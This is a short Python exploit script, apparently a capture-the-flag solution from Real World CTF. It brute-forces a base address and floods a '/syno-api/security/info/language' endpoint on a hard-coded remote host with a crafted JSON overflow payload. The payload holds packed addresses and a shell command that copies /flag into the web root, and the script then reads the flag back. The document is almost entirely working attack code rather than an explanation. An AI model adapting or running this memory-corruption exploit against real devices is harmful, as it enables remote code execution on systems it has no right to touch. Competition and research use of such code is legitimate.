#!/usr/bin/env python3

import requests
import struct
import threading

# rwctf{d0e03372-b885-4418-9de7-145a4e66ec0d}

# HOST = 'http://localhost:8080'
HOST = 'http://47.88.48.133:39567'

def thread_fn(i):
    base = 0x400000 + (i << 16)
    print(f"base={base:#x}")
    arg0 = struct.pack('<I', base + 0xc2523)[:-1]

    tgtaddr = struct.pack('<I', base + 0x14D60)[:-1]

    payload = b'{"' + b'h'*0xa4  + b'ABCD' + arg0 + b' ' + b'h'*(0xa4-0x20) + tgtaddr +  b'": "world"}\x00' + b'/'*0x4000 + b'/bin/cp /flag   /www/index.html\x00\x01'
    try:
        for i in range(64):
            r = requests.post(f"{HOST}/syno-api/security/info/language", headers={'Content-Type':'application/json'}, data=payload)
    except:
        pass


tlist = []
for i in range(16):
    t = threading.Thread(target=thread_fn, args=(i,))
    t.start()
    tlist.append(t)

print('waiting')
for i in range(16):
    tlist[i].join()

print("Flag: " + requests.get(f"{HOST}/index.html").text.strip())
